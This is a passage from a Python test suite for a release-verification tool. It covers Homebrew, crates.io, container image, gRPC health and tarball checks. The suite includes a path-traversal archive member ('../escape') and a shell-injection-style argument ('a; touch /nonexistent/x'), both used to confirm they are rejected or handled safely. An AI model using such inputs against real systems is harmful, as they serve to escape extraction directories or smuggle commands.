            self.assertIn("aasm-aarch64-apple-darwin.tar.gz", d)

    def test_wrong_tap_version_fails(self):
        for cid, path, binary in self.CASES:
            self.assertEqual(one(self.reg(path, binary, version="0.0.1-rc.7"), cid)[0], "FAIL")

    def test_formula_missing_or_without_binary_fails(self):
        for cid, path, binary in self.CASES:
            self.assertEqual(one(self.reg(path, binary, tap_status=404), cid)[0], "FAIL")
            self.assertEqual(one(self.reg(path, "other-binary"), cid)[0], "FAIL")

    def test_url_naming_another_tag_or_unknown_tarball_fails(self):
        gh = self.reg("Formula/aasm.rb", "aa-gateway")
        sums = {n: s for s, n in (line.split("  ") for line in gh.sums.decode().splitlines())}
        gh.routes.insert(0, ("contents/Formula/aasm.rb", ppv.Response(200, {}, formula(url_base="v0.0.1-rc.7", sums=sums).encode())))
        self.assertEqual(one(gh, "j04.published_homebrew_tap_install")[0], "FAIL")
        gh.routes.insert(0, ("contents/Formula/aasm.rb", ppv.Response(200, {}, formula(sums=sums, names=("nope.tar.gz",)).encode())))
        self.assertEqual(one(gh, "j04.published_homebrew_tap_install")[0], "FAIL")

    def test_formula_without_any_sha_pair_fails(self):
        gh = self.reg("Formula/aasm.rb", "aa-gateway")
        gh.routes.insert(0, ("contents/Formula/aasm.rb", ppv.Response(200, {}, b"aa-gateway only\n")))
        self.assertEqual(one(gh, "j04.published_homebrew_tap_install")[0], "FAIL")


class CratesTests(TestCase):
    ID = "j04.published_crates_io_aa_cli"

    def reg(self, num=VER, yanked=False, status=200, body=None):
        doc = body if body is not None else json.dumps({"version": {"num": num, "yanked": yanked}}).encode()
        return FakeRegistry().route("crates.io/api/v1/crates/aa-cli/", ppv.Response(status, {}, doc))

    def test_pass_and_request_shape(self):
        r = self.reg()
        self.assertEqual(one(r, self.ID)[0], "PASS")
        self.assertEqual(r.calls[0][0], f"https://crates.io/api/v1/crates/aa-cli/{VER}")
        self.assertIn("User-Agent", r.calls[0][1])

    def test_yanked_wrong_version_missing_fail(self):
        self.assertEqual(one(self.reg(yanked=True), self.ID)[0], "FAIL")
        self.assertEqual(one(self.reg(num="0.0.1-rc.7"), self.ID)[0], "FAIL")
        self.assertEqual(one(self.reg(status=404), self.ID)[0], "FAIL")

    def test_garbage_or_error_is_inconclusive(self):
        self.assertEqual(one(self.reg(body=b"<html>"), self.ID)[0], "INCONCLUSIVE")
        self.assertEqual(one(self.reg(status=502), self.ID)[0], "INCONCLUSIVE")
        self.assertEqual(one(self.reg(yanked="maybe"), self.ID)[0], "FAIL")


class ImagesTests(TestCase):
    ID = "j17.published_container_image_manifest"

    def test_pass_covers_runtime_and_gateway(self):
        reg = good_ghcr(good_ghcr(FakeRegistry(), "aa-runtime", index_doc()), "aa-gateway", index_doc())
        self.assertEqual(one(reg, self.ID)[0], "PASS")
        self.assertTrue(any("aa-runtime" in u for u, _ in reg.calls) and any("aa-gateway" in u for u, _ in reg.calls))

    def test_gateway_single_arch_or_runtime_absent_fails(self):
        reg = good_ghcr(good_ghcr(FakeRegistry(), "aa-runtime", index_doc()), "aa-gateway", index_doc(platforms=("linux/amd64",)))
        self.assertEqual(one(reg, self.ID)[0], "FAIL")
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        self.assertEqual(one(reg, self.ID)[0], "FAIL")


class RunsHealthyTests(TestCase):
    ID = "j53-published-image-runs-healthy"

    def docker(self, running="true", exit_code="0", run_rc=0, stop_rc=0):
        def h(argv, cwd):
            sub = argv[1]
            if sub == "run":
                return run_rc, "cid\n", "pull failed" if run_rc else ""
            if sub == "port":
                return 0, "127.0.0.1:49153\n", ""
            if sub == "inspect":
                return 0, (running if "Running" in argv[3] else exit_code) + "\n", ""
            if sub == "stop":
                return stop_rc, "", ""
            return 0, "", ""
        return h

    def reg(self):
        return good_ghcr(FakeRegistry(), "aa-gateway", index_doc())

    def go(self, **kw):
        health = kw.pop("health", ("SERVING",))
        t = FakeTools(handler=self.docker(**kw), health=health)
        return one(self.reg(), self.ID, tools=t), t

    def test_pass_runs_the_digest_pinned_image_and_removes_the_container(self):
        (st, d), t = self.go()
        self.assertEqual(st, "PASS", d)
        run = next(a for a in t.argvs if a[1] == "run")
        self.assertIn(f"ghcr.io/ai-agent-assembly/aa-gateway@{dg(index_doc())}", run)
        self.assertEqual(t.argvs[-1][1:3], ["rm", "-f"])
        self.assertEqual(t.health_calls, 1)

    def test_docker_absent_is_inconclusive_and_nothing_ran(self):
        t = FakeTools(present=("cosign",))
        self.assertEqual(one(self.reg(), self.ID, tools=t)[0], "INCONCLUSIVE")
        self.assertEqual(t.argvs, [])

    def test_never_serving_fails_after_bounded_attempts_and_still_cleans_up(self):
        (st, d), t = self.go(health=("NOT_SERVING", ppv.FetchError("ConnectionRefusedError")))
        self.assertEqual(st, "FAIL")
        self.assertEqual(t.health_calls, ppv.HEALTH_ATTEMPTS)
        self.assertEqual(t.argvs[-1][1:3], ["rm", "-f"])

    def test_container_that_exited_fails(self):
        (st, d), t = self.go(running="false")
        self.assertEqual(st, "FAIL")
        self.assertEqual(t.health_calls, 0)
        self.assertEqual(t.argvs[-1][1:3], ["rm", "-f"])

    def test_nonzero_exit_after_sigterm_fails(self):
        self.assertEqual(self.go(exit_code="137")[0][0], "FAIL")

    def test_docker_run_error_is_inconclusive(self):
        self.assertEqual(self.go(run_rc=125)[0][0], "INCONCLUSIVE")

    def test_unpublished_image_fails_before_docker_runs(self):
        t = FakeTools()
        self.assertEqual(one(FakeRegistry().route("ghcr.io/token", ppv.Response(200, {}, b'{"token":"x"}')), self.ID, tools=t)[0], "FAIL")
        self.assertEqual(t.argvs, [])


class GrpcHealthClientTests(TestCase):
    def serve(self, reply: bytes):
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        seen = {}

        def frame(kind, flags, sid, payload):
            return len(payload).to_bytes(3, "big") + bytes([kind, flags]) + sid.to_bytes(4, "big") + payload

        def run():
            c, _ = srv.accept()
            buf = b""
            while b"/grpc.health.v1.Health/Check" not in buf or len(buf) < 24 + 9 + 5 + 9:
                chunk = c.recv(4096)
                if not chunk:
                    break
                buf += chunk
            seen["request"] = buf
            c.sendall(frame(4, 0, 0, b"") + frame(4, 1, 0, b"") + frame(1, 0x4, 1, b"\x88")
                      + frame(0, 0, 1, reply) + frame(1, 0x5, 1, b"\x00\x0bgrpc-status\x010"))
            c.close()
            srv.close()
        th = threading.Thread(target=run, daemon=True)
        th.start()
        return srv.getsockname()[1], th, seen

    def test_serving_roundtrip_and_request_framing(self):
        port, th, seen = self.serve(b"\x00\x00\x00\x00\x02\x08\x01")
        self.assertEqual(ppv.grpc_health_check("127.0.0.1", port, 5), "SERVING")
        th.join(5)
        self.assertTrue(seen["request"].startswith(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
        self.assertIn(b"application/grpc", seen["request"])

    def test_not_serving_status_is_reported(self):
        port, th, _ = self.serve(b"\x00\x00\x00\x00\x02\x08\x02")
        self.assertEqual(ppv.grpc_health_check("127.0.0.1", port, 5), "STATUS_2")

    def test_empty_or_malformed_responses_are_errors_not_serving(self):
        for bad in (b"", b"\x00\x00\x00\x00\x05\x08", b"\x01\x00\x00\x00\x02\x08\x01"):
            with self.assertRaises(ppv.FetchError):
                ppv.parse_health_response(bad)


def tarball(members: dict[str, bytes], evil: str | None = None) -> bytes:
    b = _io.BytesIO()
    with tarfile.open(fileobj=b, mode="w:gz") as tf:
        for n, data in members.items():
            ti = tarfile.TarInfo(n)
            ti.size = len(data)
            tf.addfile(ti, _io.BytesIO(data))
        if evil:
            ti = tarfile.TarInfo(evil)
            ti.size = 1
            tf.addfile(ti, _io.BytesIO(b"x"))
    return b.getvalue()


class GoldenPathTests(TestCase):
    ID = "j59-published-binaries-golden-path"
    SHA = "c" * 40

    def files(self, evil=None, api_members=None):
        return {f"aasm-cli-{TAG}-linux-amd64.tar.gz": tarball({"pkg/aasm": b"aasm-bin"}, evil),
                f"aasm-api-{TAG}-linux-amd64.tar.gz": tarball(api_members or {"aa-api-server": b"api-bin"})}

    def gh(self, **kw):
        names = [n for n in ppv.required_assets(TAG) if n != "SHA256SUMS"]
        files = {n: f"c-{n}".encode() for n in names}
        files.update(self.files(kw.pop("evil", None), kw.pop("api_members", None)))
        gh = Gh(files=files, **kw)
        gh.routes.insert(0, ("/commits/", ppv.Response(200, {}, json.dumps({"sha": self.SHA}).encode())))
        return gh

    def harness(self, verdict="CANDIDATE_VERIFIED", rc=0, statuses=("PASS", "PASS"), out=None):
        seen = {}

        def h(argv, cwd):
            seen["argv"] = argv
            seen["bins_exist"] = [Path(argv[argv.index(f)+1]).is_file() for f in ("--aasm-bin", "--api-server-bin")]
            seen["expected"] = json.loads(Path(argv[argv.index("--expected-digests") + 1]).read_text())
            body = out if out is not None else json.dumps({"verdict": verdict, "candidate_checks": [
                {"id": f"c{i}", "status": s} for i, s in enumerate(statuses)]})
            return rc, body, ""
        return h, seen

    def test_pass_runs_the_harness_on_verified_extracted_binaries(self):
        h, seen = self.harness()
        st, d = one(self.gh(), self.ID, tools=FakeTools(handler=h))
        self.assertEqual(st, "PASS", d)
        argv = seen["argv"]
        self.assertEqual(argv[1:2], ["-I"])
        self.assertEqual(seen["bins_exist"], [True, True])
        self.assertEqual(argv[argv.index("--candidate-sha") + 1], self.SHA)
        self.assertEqual(argv[argv.index("--expected-version") + 1], VER)
        self.assertEqual(seen["expected"]["aasm"], "sha256:" + hx(b"aasm-bin"))

    def test_tarball_not_matching_sums_fails_and_harness_never_runs(self):
        t = FakeTools(handler=self.harness()[0])
        gh = self.gh()
        bad = {l.split("  ")[1]: l.split("  ")[0] for l in gh.sums.decode().splitlines()}
        bad[f"aasm-cli-{TAG}-linux-amd64.tar.gz"] = "0" * 64
        gh2 = self.gh(sums_override="".join(f"{v}  {k}\n" for k, v in bad.items()).encode())
        st, d = one(gh2, self.ID, tools=t)
        self.assertEqual(st, "FAIL")
        self.assertEqual(t.argvs, [])

    def test_tarball_missing_asset_fails(self):
        t = FakeTools(handler=self.harness()[0])
        self.assertEqual(one(self.gh(drop=(f"aasm-api-{TAG}-linux-amd64.tar.gz",)), self.ID, tools=t)[0], "FAIL")
        self.assertEqual(t.argvs, [])

    def test_unsafe_member_path_fails(self):
        t = FakeTools(handler=self.harness()[0])
        self.assertEqual(one(self.gh(evil="../escape"), self.ID, tools=t)[0], "FAIL")
        self.assertEqual(t.argvs, [])

    def test_archive_without_the_binary_fails(self):
        t = FakeTools(handler=self.harness()[0])
        self.assertEqual(one(self.gh(api_members={"README": b"x"}), self.ID, tools=t)[0], "FAIL")

    def test_harness_block_fails(self):
        h, _ = self.harness(verdict="BLOCK", rc=1, statuses=("PASS", "FAIL"))
        self.assertEqual(one(self.gh(), self.ID, tools=FakeTools(handler=h))[0], "FAIL")

    def test_harness_incomplete_is_inconclusive_never_pass(self):
        h, _ = self.harness(verdict="CANDIDATE_INCOMPLETE", rc=3, statuses=("PASS", "NOT_COVERED"))
        self.assertEqual(one(self.gh(), self.ID, tools=FakeTools(handler=h))[0], "INCONCLUSIVE")

    def test_exit_zero_with_a_non_pass_check_or_no_checks_is_not_pass(self):
        h, _ = self.harness(statuses=("PASS", "NOT_COVERED"))
        self.assertNotEqual(one(self.gh(), self.ID, tools=FakeTools(handler=h))[0], "PASS")
        h, _ = self.harness(statuses=())
        self.assertNotEqual(one(self.gh(), self.ID, tools=FakeTools(handler=h))[0], "PASS")

    def test_unparseable_harness_output_is_inconclusive(self):
        h, _ = self.harness(out="Traceback...")
        self.assertEqual(one(self.gh(), self.ID, tools=FakeTools(handler=h))[0], "INCONCLUSIVE")

    def test_unsupported_platform_is_inconclusive(self):
        t = FakeTools(system=("Windows", "AMD64"), handler=self.harness()[0])
        self.assertEqual(one(self.gh(), self.ID, tools=t)[0], "INCONCLUSIVE")


class RealToolsTests(TestCase):
    def test_timeout_is_a_fetch_error_and_argv_is_not_a_shell(self):
        with self.assertRaises(ppv.FetchError):
            ppv.Tools().run([sys.executable, "-I", "-c", "import time; time.sleep(5)"], 0.3)
        rc, out, _ = ppv.Tools().run([sys.executable, "-I", "-c", "import sys; print(sys.argv[1])", "a; touch /nonexistent/x"], 10)
        self.assertEqual((rc, out.strip()), (0, "a; touch /nonexistent/x"))

    def test_missing_program_is_a_fetch_error(self):
        with self.assertRaises(ppv.FetchError):
            ppv.Tools().run(["/nonexistent/program"], 5)


class EveryPendingIdHasAnAutomatedRunnerTests(TestCase):
    def test_pending_ids_match_the_harness_definitions(self):
        """The ids are read from the harness sources, so a renamed or added pending id
        without a runner fails here rather than at the gate."""
        found = set()
        for rel in ("scripts/qa/b1/candidate_harness.py", "scripts/qa/j53-candidate-harness.py", "scripts/qa/j59-candidate-harness.py"):
            found |= set(re.findall(r'"((?:j04|j17)\.published_[a-z0-9_]+|j53-published-[a-z-]+|j59-published-[a-z-]+)"',
                                    (ROOT / rel).read_text()))
        self.assertTrue(PENDING_IDS <= found, sorted(PENDING_IDS - found))
        self.assertEqual(found - ppv.automated_runner_ids(), set())

    def test_main_accepts_the_tools_seam_end_to_end(self):
        gh = Gh()
        rc, rep, _ = run_main(gh, ["j04.published_release_checksums_and_signature"], argv_extra=())
        self.assertIn(rep["results"][0]["status"], ("PASS", "INCONCLUSIVE", "FAIL"))
        t = FakeTools(present=())
        d = Path(tempfile.mkdtemp(prefix="ppv-test-"))
        atexit.register(shutil.rmtree, d, True)
        (d / "o.json").write_text(json.dumps(obligations(["j04.published_release_checksums_and_signature"])))
        with contextlib.redirect_stdout(io.StringIO()) as buf:
            code = ppv.main(["--tag", TAG, "--obligations", str(d / "o.json")], fetch=Gh(), tools=t)
        self.assertEqual(code, 3)
        self.assertEqual(json.loads(buf.getvalue())["results"][0]["status"], "INCONCLUSIVE")



if __name__ == "__main__":
    main(verbosity=2)
